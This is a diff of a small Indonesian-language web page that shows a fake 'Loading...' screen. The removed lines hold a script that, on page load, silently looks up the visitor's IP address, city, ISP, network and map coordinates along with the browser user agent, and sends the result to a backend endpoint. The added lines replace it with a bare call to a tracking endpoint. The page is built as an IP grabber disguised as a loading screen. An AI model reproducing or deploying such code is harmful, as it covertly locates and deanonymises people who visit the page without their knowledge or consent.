@@ -1,53 +1,14 @@
 <!DOCTYPE html>
 <html lang="id">
-<head>
-  <meta charset="UTF-8" />
-  <title>Loading...</title>
-</head>
-<body>
-  <h3>Sedang memuat...</h3>
-
-  <script>
-    async function sendVisitorData() {
-      try {
-        // Ambil IP & lokasi dari ip-api
-        const res = await fetch("https://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,zip");
-        const data = await res.json();
-
-        if (data.status !== "success") {
-          throw new Error(data.message || "Gagal ambil data IP");
-        }
-
-        const ua = navigator.userAgent;
-
-        const text = `
-📡 *Pengunjung Baru!*
-🌐 IP: ${data.query}
-🌍 Negara: ${data.country}
-🏙 Kota: ${data.city}, ${data.regionName} ${data.zip}
-🛰 ISP: ${data.isp}
-🏢 Org: ${data.org}
-⚡ ASN: ${data.as}
-⌚ Zona Waktu: ${data.timezone}
-📌 Koordinat: ${data.lat}, ${data.lon}
-🔗 https://www.google.com/maps?q=${data.lat},${data.lon}
-
-📱 Device: ${ua}
-        `;
-
-        // Kirim ke API backend
-        await fetch("/api/send", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ text })
-        });
-
-      } catch (err) {
-        console.error("Error:", err);
-      }
-    }
-
-    sendVisitorData();
-  </script>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Loading...</title>
+    <script>
+      // otomatis panggil API track
+      fetch("/api/track");
+    </script>
+  </head>
+  <body>
+    <h3>Sedang memuat...</h3>
+  </body>
 </html>
